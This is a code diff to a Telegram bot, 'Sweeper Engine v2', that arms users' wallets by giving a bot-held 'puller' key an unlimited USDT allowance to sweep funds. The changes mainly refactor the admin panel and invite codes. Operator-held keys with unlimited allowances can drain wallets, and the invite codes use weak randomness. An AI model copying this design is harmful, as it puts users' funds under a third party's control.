@@ -1,6 +1,7 @@
-import { Telegraf, Markup } from 'telegraf';
+import { Telegraf } from 'telegraf';
 import { authGuard } from './middleware';
-import { mainKeyboard, adminKeyboard, backKeyboard } from './keyboards';
+import { mainKeyboardFor, adminKeyboard, backKeyboard } from './keyboards';
+import { getBotUsername, inviteLink } from './state';
 import {
   upsertTarget, deactivate, listActive, newPuller, addToken,
   findTarget, setPuller, adminStats,
@@ -20,7 +21,7 @@ const HELP = `*How this works*
 Send:
 \`/arm <agentic_wallet> <cold_destination>\`
 
-The bot creates a *puller* key — a separate address that is allowed to move your USDT. It is encrypted in the database.
+The bot creates a *puller* key — a separate address allowed to move your USDT. It is encrypted in the database.
 
 *2. Pair once*
 Tap the link, confirm the code in the Binance App. Developer Mode must be ON. The bot then grants the puller an unlimited USDT allowance.
@@ -49,12 +50,14 @@ export function buildBot() {
 
   bot.start(async ctx => {
     await ctx.reply('⚡ *Sweeper Engine v2*\n\nPuller mode.', {
-      parse_mode: 'Markdown', ...mainKeyboard,
+      parse_mode: 'Markdown', ...mainKeyboardFor(isAdmin(ctx.from?.id)),
     });
   });
 
   bot.command('menu', ctx =>
-    ctx.reply('⚡ *Sweeper Engine v2*', { parse_mode: 'Markdown', ...mainKeyboard }));
+    ctx.reply('⚡ *Sweeper Engine v2*', {
+      parse_mode: 'Markdown', ...mainKeyboardFor(isAdmin(ctx.from?.id)),
+    }));
 
   bot.command('help', ctx => ctx.reply(HELP, { parse_mode: 'Markdown', ...backKeyboard }));
   bot.action('HELP', async ctx => {
@@ -87,7 +90,8 @@ export function buildBot() {
             { parse_mode: 'Markdown' });
         }
       }
-      await ctx.reply('✅ Armed. Fund the puller with BNB.', { parse_mode: 'Markdown', ...mainKeyboard });
+      await ctx.reply('✅ Armed. Fund the puller with BNB.',
+        { parse_mode: 'Markdown', ...mainKeyboardFor(isAdmin(userId)) });
     } catch (e: any) {
       await ctx.reply(`❌ Pairing failed: \`${String(e.stdout || e.message).slice(0, 140)}\``,
         { parse_mode: 'Markdown' });
@@ -116,8 +120,7 @@ export function buildBot() {
     const id = await findTarget(ctx.from!.id, target);
     if (!id) return ctx.reply('Unknown wallet. /arm first.');
     await addToken(id, token);
-    await ctx.reply(`Added \`${token}\`. Grant the allowance from the wallet, then it is live.`,
-      { parse_mode: 'Markdown' });
+    await ctx.reply(`Added \`${token}\`. Grant the allowance from the wallet.`, { parse_mode: 'Markdown' });
   });
 
   bot.command('unlink', async ctx => {
@@ -130,7 +133,7 @@ export function buildBot() {
   bot.action('MONITORS', async ctx => {
     await ctx.answerCbQuery();
     const rows = await listActive(ctx.from!.id);
-    if (!rows.length) return ctx.reply('No targets. /arm first.', { parse_mode: 'Markdown' });
+    if (!rows.length) return ctx.reply('No targets. /arm first.');
     const body = await Promise.all(rows.map(async r => {
       if (!r.puller) return `• \`${r.target}\`\n  ❌ no puller — /repair`;
       const lines = await Promise.all(r.tokens.map(async tok => {
@@ -144,10 +147,9 @@ export function buildBot() {
 
   bot.action('FUND', async ctx => {
     await ctx.answerCbQuery();
-    const rows = await listActive(ctx.from!.id);
-    const withPuller = rows.filter(r => r.puller);
-    if (!withPuller.length) return ctx.reply('No pullers yet. /arm first.');
-    const lines = await Promise.all(withPuller.map(async r =>
+    const rows = (await listActive(ctx.from!.id)).filter(r => r.puller);
+    if (!rows.length) return ctx.reply('No pullers yet. /arm first.');
+    const lines = await Promise.all(rows.map(async r =>
       `\`${r.puller}\` — ${Number(await gasOf(r.puller!)) / 1e18} BNB`));
     await ctx.reply(`*Fund these with ~0.02 BNB each:*\n\n${lines.join('\n')}`, { parse_mode: 'Markdown' });
   });
@@ -157,10 +159,26 @@ export function buildBot() {
     await ctx.reply('Use `/addtoken <wallet> <token_address>`', { parse_mode: 'Markdown' });
   });
 
-  // ---------- admin panel ----------
+  // ---------- admin ----------
   bot.command('admin', async ctx => {
     if (!isAdmin(ctx.from!.id)) return ctx.reply('🔒 Admin only.');
     await ctx.reply('🛠 *Admin Panel*', { parse_mode: 'Markdown', ...adminKeyboard });
+  });
+
+  bot.action('A_PANEL', async ctx => {
+    if (!isAdmin(ctx.from!.id)) return ctx.answerCbQuery('Admin only');
+    await ctx.answerCbQuery();
+    await ctx.reply('🛠 *Admin Panel*', { parse_mode: 'Markdown', ...adminKeyboard });
+  });
+
+  bot.action('A_INVITE_GEN', async ctx => {
+    if (!isAdmin(ctx.from!.id)) return ctx.answerCbQuery('Admin only');
+    await ctx.answerCbQuery();
+    const code = 'BEE-' + Math.random().toString(36).slice(2, 8).toUpperCase();
+    await db.query(`INSERT INTO invite_codes (code) VALUES ($1)`, [code]);
+    await ctx.reply(
+      `🎟 *Invite generated* — 24h, single use\n\n\`${code}\`\n${inviteLink(code)}`,
+      { parse_mode: 'Markdown', link_preview_options: { is_disabled: true }, ...adminKeyboard });
   });
 
   bot.action('A_STATS', async ctx => {
@@ -168,14 +186,15 @@ export function buildBot() {
     await ctx.answerCbQuery();
     const s = await adminStats();
     await ctx.reply(
-      `*Stats*\nUsers: ${s.users}\nActive targets: ${s.targets}\nReady (allowance ok): ${s.ready}\nOrphans: ${s.orphans}`,
+      `*Stats*\nUsers: ${s.users}\nActive targets: ${s.targets}\nReady: ${s.ready}\nOrphans: ${s.orphans}`,
       { parse_mode: 'Markdown', ...adminKeyboard });
   });
 
   bot.action('A_USERS', async ctx => {
     if (!isAdmin(ctx.from!.id)) return ctx.answerCbQuery('Admin only');
     await ctx.answerCbQuery();
-    const { rows } = await db.query(`SELECT user_id, username FROM authorized_users ORDER BY created_at DESC LIMIT 50`);
+    const { rows } = await db.query(
+      `SELECT user_id, username FROM authorized_users ORDER BY created_at DESC LIMIT 50`);
     await ctx.reply(
       rows.length ? rows.map(r => `\`${r.user_id}\` ${r.username ?? ''}`).join('\n') : 'none',
       { parse_mode: 'Markdown', ...adminKeyboard });
@@ -185,39 +204,19 @@ export function buildBot() {
     if (!isAdmin(ctx.from!.id)) return ctx.answerCbQuery('Admin only');
     await ctx.answerCbQuery();
     const rows = await listActive();
-    if (!rows.length) return ctx.reply('No targets.', adminKeyboard);
-    const body = rows.map(r =>
-      `\`${r.target}\` u${r.userId}\n puller ${r.puller ? '✅' : '❌'} tokens ${r.tokens.length}`);
-    await ctx.reply(`*All targets*\n\n${body.join('\n\n')}`, { parse_mode: 'Markdown', ...adminKeyboard });
+    if (!rows.length) return ctx.reply('No targets.');
+    await ctx.reply(
+      `*All targets*\n\n${rows.map(r =>
+        `\`${r.target}\` u${r.userId}\n puller ${r.puller ? '✅' : '❌'} tokens ${r.tokens.length}`).join('\n\n')}`,
+      { parse_mode: 'Markdown', ...adminKeyboard });
   });
 
   bot.action('A_ENGINE', async ctx => {
     if (!isAdmin(ctx.from!.id)) return ctx.answerCbQuery('Admin only');
     await ctx.answerCbQuery();
-    const up = Math.round((Date.now() - engineState.startedAt) / 1000);
     await ctx.reply(
-      `*Engine*\narmed: ${engineState.armed}\ntargets: ${engineState.targets}\nblocks: ${engineState.blocks}\nlast block: ${engineState.lastBlock}\nuptime: ${up}s`,
+      `*Engine*\narmed: ${engineState.armed}\ntargets: ${engineState.targets}\nblocks: ${engineState.blocks}\nuptime: ${Math.round((Date.now() - engineState.startedAt) / 1000)}s`,
       { parse_mode: 'Markdown', ...adminKeyboard });
-  });
-
-  bot.action('A_INVITES', async ctx => {
-    if (!isAdmin(ctx.from!.id)) return ctx.answerCbQuery('Admin only');
-    await ctx.answerCbQuery();
-    const { rows } = await db.query(
-      `SELECT code, expires_at FROM invite_codes WHERE used_by IS NULL AND expires_at > NOW() ORDER BY created_at DESC`);
-    if (!rows.length) return ctx.reply('No live invites.', adminKeyboard);
-    const body = rows.map(r => `\`${r.code}\` — https://t.me/${ctx.botInfo?.username}?start=${r.code}`);
-    await ctx.reply(`*Live invites*\n\n${body.join('\n')}`, {
-      parse_mode: 'Markdown', link_preview_options: { is_disabled: true }, ...adminKeyboard });
-  });
-
-  bot.command('invite', async ctx => {
-    if (!isAdmin(ctx.from!.id)) return ctx.reply('🔒 Admin only.');
-    const code = 'BEE-' + Math.random().toString(36).slice(2, 8).toUpperCase();
-    await db.query(`INSERT INTO invite_codes (code) VALUES ($1)`, [code]);
-    await ctx.reply(
-      `*Invite created* (24h, single use)\n\n\`${code}\`\nhttps://t.me/${ctx.botInfo?.username}?start=${code}`,
-      { parse_mode: 'Markdown', link_preview_options: { is_disabled: true }, ...adminKeyboard });
   });
 
   bot.command('broadcast', async ctx => {
@@ -230,12 +229,14 @@ export function buildBot() {
       try { await ctx.telegram.sendMessage(r.user_id, text, { parse_mode: 'Markdown' }); ok++; }
       catch { /* blocked */ }
     }
-    await ctx.reply(`Sent to ${ok}/${rows.length}.`);
+    await ctx.reply(`Sent ${ok}/${rows.length}.`);
   });
 
   bot.action('MENU', async ctx => {
     await ctx.answerCbQuery();
-    await ctx.editMessageText('⚡ *Sweeper Engine v2*', { parse_mode: 'Markdown', ...mainKeyboard });
+    await ctx.editMessageText('⚡ *Sweeper Engine v2*', {
+      parse_mode: 'Markdown', ...mainKeyboardFor(isAdmin(ctx.from?.id)),
+    });
   });
 
   return bot;
